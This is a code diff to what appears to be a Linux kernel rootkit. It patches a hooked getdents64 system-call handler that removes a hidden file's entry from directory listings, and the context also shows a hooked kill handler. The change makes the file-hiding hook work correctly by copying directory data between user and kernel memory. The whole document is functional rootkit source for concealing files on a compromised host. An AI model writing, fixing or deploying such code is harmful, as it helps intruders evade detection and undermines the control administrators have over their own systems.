@@ -155,12 +155,15 @@ asmlinkage long kill_hook(const struct pt_regs *regs)
 asmlinkage long getdents64_hook(const struct pt_regs *regs)
 {
     long nread = orig_getdents64(regs);
-    struct linux_dirent64 *buf = (struct linux_dirent64 *) regs->regs[1];
+    struct linux_dirent64 *buf = kmalloc(nread, GFP_KERNEL);
     struct linux_dirent64 *dirent = NULL;
     int pos;
-    unsigned short offset;
+    unsigned short offset = 0;
 
-    if (hidden_file.len == 0) return nread;
+    if (hidden_file.len == 0) goto leave;
+
+    if (copy_from_user(buf, (struct linux_dirent64 __user *) regs->regs[1], nread))
+        return -1;
 
     for (pos = 0; pos < nread; pos += dirent->d_reclen) {
         dirent = (struct linux_dirent64 *) ((char *) buf + pos);
@@ -173,6 +176,11 @@ asmlinkage long getdents64_hook(const struct pt_regs *regs)
     }
     memmove((char *) buf + pos, (char *) buf + pos + offset, nread - pos - offset);
 
+    if (copy_to_user((struct linux_dirent64 __user *) regs->regs[1], buf, nread - offset))
+        return -1;
+
+leave:
+    kfree(buf);
     return nread - offset;
 }
 
